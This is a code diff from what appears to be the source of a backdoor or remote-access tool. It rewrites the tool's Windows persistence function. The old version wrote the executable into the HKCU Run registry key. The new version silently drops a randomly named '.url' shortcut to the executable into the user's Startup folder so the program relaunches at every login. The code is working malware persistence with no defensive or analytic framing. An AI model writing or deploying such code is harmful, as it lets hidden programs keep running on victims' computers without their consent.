@@ -7,19 +7,25 @@ import sys
 
 
 def windows_persistence():
-    import _winreg
-    from _winreg import HKEY_CURRENT_USER as HKCU
-
-    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
-    bin_path = sys.executable
-
+    import os, string, random
     try:
-        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
-        _winreg.SetValueEx(reg_key, 'br', 0, _winreg.REG_SZ, bin_path)
-        _winreg.CloseKey(reg_key)
-        return True, 'HKCU Run registry key applied'
+        appdata = os.path.expandvars("%AppData%")
+        startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
+        if os.path.exists(startup_dir):
+            random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])
+            persistence_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
+
+            content = '\n[InternetShortcut]\nURL=file:///%s\n' % sys.executable
+
+            f = open(persistence_file, 'w')
+            f.write(content)
+            f.close()
+        
+            return True, 'startup file add success'
+        else:
+            return False, 'startup file add failed'
     except WindowsError:
-        return False, 'HKCU Run registry key failed'
+        return False, 'startup file add failed'
 
 
 def linux_persistence():
